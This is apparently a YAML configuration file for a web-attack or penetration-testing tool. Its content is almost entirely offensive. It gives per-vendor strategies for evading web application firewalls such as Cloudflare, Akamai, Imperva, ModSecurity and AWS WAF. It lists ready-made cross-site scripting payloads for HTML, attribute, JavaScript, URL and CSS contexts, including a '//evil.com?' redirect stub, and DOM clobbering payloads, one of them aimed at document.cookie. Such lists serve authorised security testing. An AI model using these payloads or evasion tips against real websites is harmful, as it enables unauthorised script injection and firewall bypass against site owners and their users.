# ==============================================================================
# ENCODING STRATEGIES BY WAF
# ==============================================================================
waf_encoding_strategies:
  cloudflare:
    primary: [unicode, url]
    secondary: [case-variation, null-byte]
    notes: "Cloudflare is sophisticated; use unicode and avoid common keywords"

  akamai:
    primary: [double-url, mixed-case]
    secondary: [comment-insertion, parameter-pollution]
    notes: "Akamai Kona requires creative encoding; try chunked payloads"

  imperva:
    primary: [whitespace, html-entity]
    secondary: [mixed-encoding, protocol-variation]
    notes: "Incapsula/Imperva blocks common patterns; use encoding combinations"

  modsecurity:
    primary: [comment-insertion, case-variation]
    secondary: [null-byte, whitespace]
    notes: "ModSecurity rules can be bypassed with comments and case mixing"

  aws-waf:
    primary: [double-url, parameter-pollution]
    secondary: [content-type-confusion, multipart]
    notes: "AWS WAF has specific rule sets; test HTTP parameter pollution"

  sucuri:
    primary: [unicode, case-mixing]
    secondary: [whitespace-injection, protocol-variation]
    notes: "Sucuri CloudProxy has regex-based rules"

  wordfence:
    primary: [url-encoding, whitespace]
    secondary: [parameter-splitting, comment-insertion]
    notes: "WordPress-specific; test wp-specific contexts"

# ==============================================================================
# CONTEXT-SPECIFIC PAYLOADS
# ==============================================================================
context_payloads:
  html_context:
    - '<script>alert(1)</script>'
    - '<img src=x onerror=alert(1)>'
    - '<svg onload=alert(1)>'

  attribute_unquoted:
    - ' onmouseover=alert(1) '
    - ' onfocus=alert(1) autofocus '

  attribute_single_quote:
    - "' onmouseover='alert(1)'"
    - "' onfocus='alert(1)' autofocus '"

  attribute_double_quote:
    - '" onmouseover="alert(1)"'
    - '" onfocus="alert(1)" autofocus "'

  javascript_string_single:
    - "'-alert(1)-'"
    - "';alert(1)//'"
    - "\\';alert(1)//'"

  javascript_string_double:
    - '"-alert(1)-"'
    - '";alert(1)//"'
    - '\\";alert(1)//"'

  javascript_template:
    - '${alert(1)}'
    - '`${alert(1)}`'

  url_context:
    - 'javascript:alert(1)'
    - 'data:text/html,<script>alert(1)</script>'
    - '//evil.com?'

  css_context:
    - 'expression(alert(1))'
    - 'url(javascript:alert(1))'
    - "};alert(1)//'"

# ==============================================================================
# DOM CLOBBERING PAYLOADS
# ==============================================================================
dom_clobbering_payloads:
  - value: '<form id=x><input name=y value=z>'
    description: "Form-based clobbering"
    target: "document.x.y"

  - value: '<img name=x>'
    description: "Image name clobbering"
    target: "document.x"

  - value: '<a id=x href=y>'
    description: "Anchor href clobbering"
    target: "x.href"

  - value: '<form id=document><input name=cookie>'
    description: "Document cookie clobbering"
    target: "document.cookie"

  - value: '<iframe name=x srcdoc="<a id=y href=z>">'
    description: "Iframe-based clobbering"
    target: "x.y.href"

